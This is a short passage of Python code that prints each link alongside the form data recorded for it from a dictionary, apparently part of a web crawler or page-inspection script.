                print("Link:", link, "\nForm:\n", links_forms_files_in_form[link])
                print("------")
